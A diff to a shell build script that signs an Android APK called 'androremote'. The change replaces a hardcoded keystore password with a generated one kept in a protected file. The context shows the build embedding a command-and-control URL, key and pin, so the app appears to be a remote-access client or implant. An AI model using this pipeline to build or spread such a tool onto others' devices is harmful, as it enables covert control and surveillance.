@@ -15,6 +15,25 @@ OUT="$ROOT/build/apk"
 RES="$ROOT/app/src/main/res"
 LIBS="$ROOT/libs"
 
+# Signing key: bring your own, never shared. Generated on first build when absent.
+# Password sources: $KS_PASS, else .pass beside the keystore, else generated.
+KS="${KS:-$ROOT/keystore/release.keystore}"
+KSPASSFILE="$(dirname "$KS")/.pass"
+KSPASS="${KS_PASS:-}"
+[ -z "$KSPASS" ] && [ -f "$KSPASSFILE" ] && KSPASS=$(tr -d ' \n' < "$KSPASSFILE")
+if [ ! -f "$KS" ]; then
+    KSPASS="${KSPASS:-$(openssl rand -hex 16)}"
+    mkdir -p "$(dirname "$KS")"
+    "$J8/bin/keytool" -genkeypair -keystore "$KS" -alias androremote \
+        -keyalg RSA -keysize 2048 -validity 10950 \
+        -storepass "$KSPASS" -keypass "$KSPASS" \
+        -dname "CN=AndroRemote, OU=Operator, O=Self-signed, C=US"
+    printf '%s' "$KSPASS" > "$KSPASSFILE"
+    chmod 600 "$KSPASSFILE"
+    echo "generated signing key $KS (password written to $KSPASSFILE, gitignored)"
+fi
+[ -z "$KSPASS" ] && { echo "error: no keystore password — set KS_PASS or create $KSPASSFILE" >&2; exit 1; }
+
 C2URL="${1:-${C2_URL:-}}"
 C2KEY="${C2_KEY:-}"
 [ -z "$C2KEY" ] && [ -f "$HOME/.androremote/c2.key" ] && C2KEY=$(tr -d ' \n' < "$HOME/.androremote/c2.key")
@@ -60,6 +79,11 @@ cp "$OUT/dexout/classes.dex" .
 zip -q -X -0 "$OUT/z1.apk" resources.arsc
 zip -q -r -X -9 "$OUT/z1.apk" AndroidManifest.xml classes.dex res
 "$BT/zipalign" -f -p 4 "$OUT/z1.apk" "$OUT/z2.apk"
-"$BT/apksigner" sign --ks "$ROOT/keystore/release.keystore" --ks-pass pass:androremote \
-    --out "$OUT/androremote.apk" "$OUT/z2.apk"
+if [ -f "$KSPASSFILE" ]; then
+    "$BT/apksigner" sign --ks "$KS" --ks-pass "file:$KSPASSFILE" \
+        --out "$OUT/androremote.apk" "$OUT/z2.apk"
+else
+    "$BT/apksigner" sign --ks "$KS" --ks-pass "pass:$KSPASS" \
+        --out "$OUT/androremote.apk" "$OUT/z2.apk"
+fi
 echo "OK: $OUT/androremote.apk (c2_url=${C2URL:-<none>} enc=${C2KEY:+AES-256-GCM} pin=${C2PIN:+set})"
